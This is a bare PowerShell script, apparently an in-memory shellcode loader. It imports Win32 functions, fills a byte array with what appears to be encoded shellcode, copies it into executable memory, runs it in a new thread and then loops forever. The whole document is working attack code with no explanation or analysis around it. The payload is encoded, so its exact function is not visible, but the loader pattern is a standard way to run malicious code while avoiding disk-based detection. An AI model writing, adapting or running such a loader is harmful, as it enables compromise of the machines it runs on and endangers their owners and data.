
$aD3M = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $aD3M -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xce,0xb8,0xdf,0x1f,0x51,0x43,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x83,0xc3,0x04,0x31,0x43,0x14,0x03,0x43,0xcb,0xfd,0xa4,0xbf,0x1b,0x83,0x47,0x40,0xdb,0xe4,0xce,0xa5,0xea,0x24,0xb4,0xae,0x5c,0x95,0xbe,0xe3,0x50,0x5e,0x92,0x17,0xe3,0x12,0x3b,0x17,0x44,0x98,0x1d,0x16,0x55,0xb1,0x5e,0x39,0xd5,0xc8,0xb2,0x99,0xe4,0x02,0xc7,0xd8,0x21,0x7e,0x2a,0x88,0xfa,0xf4,0x99,0x3d,0x8f,0x41,0x22,0xb5,0xc3,0x44,0x22,0x2a,0x93,0x67,0x03,0xfd,0xa8,0x31,0x83,0xff,0x7d,0x4a,0x8a,0xe7,0x62,0x77,0x44,0x93,0x50,0x03,0x57,0x75,0xa9,0xec,0xf4,0xb8,0x06,0x1f,0x04,0xfc,0xa0,0xc0,0x73,0xf4,0xd3,0x7d,0x84,0xc3,0xae,0x59,0x01,0xd0,0x08,0x29,0xb1,0x3c,0xa9,0xfe,0x24,0xb6,0xa5,0x4b,0x22,0x90,0xa9,0x4a,0xe7,0xaa,0xd5,0xc7,0x06,0x7d,0x5c,0x93,0x2c,0x59,0x05,0x47,0x4c,0xf8,0xe3,0x26,0x71,0x1a,0x4c,0x96,0xd7,0x50,0x60,0xc3,0x65,0x3b,0xec,0x20,0x44,0xc4,0xec,0x2e,0xdf,0xb7,0xde,0xf1,0x4b,0x50,0x52,0x79,0x52,0xa7,0x95,0x50,0x22,0x37,0x68,0x5b,0x53,0x11,0xae,0x0f,0x03,0x09,0x07,0x30,0xc8,0xc9,0xa8,0xe5,0x65,0xcf,0x3e,0xc6,0xd2,0xce,0xfb,0xae,0x20,0xd1,0x12,0x73,0xac,0x37,0x44,0xdb,0xfe,0xe7,0x24,0x8b,0xbe,0x57,0xcc,0xc1,0x30,0x87,0xec,0xe9,0x9a,0xa0,0x86,0x05,0x73,0x98,0x3e,0xbf,0xde,0x52,0xdf,0x40,0xf5,0x1e,0xdf,0xcb,0xfa,0xdf,0x91,0x3b,0x76,0xcc,0x45,0xcc,0xcd,0xae,0xc3,0xd3,0xfb,0xc5,0xeb,0x41,0x00,0x4c,0xbc,0xfd,0x0a,0xa9,0x8a,0xa1,0xf5,0x9c,0x81,0x68,0x60,0x5f,0xfd,0x94,0x64,0x5f,0xfd,0xc2,0xee,0x5f,0x95,0xb2,0x4a,0x0c,0x80,0xbc,0x46,0x20,0x19,0x29,0x69,0x11,0xce,0xfa,0x01,0x9f,0x29,0xcc,0x8d,0x60,0x1c,0xcc,0xf2,0xb6,0x58,0xba,0x1a,0x0b;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$cyM2=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($cyM2.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$cyM2,0,0,0);for (;;){Start-sleep 60};

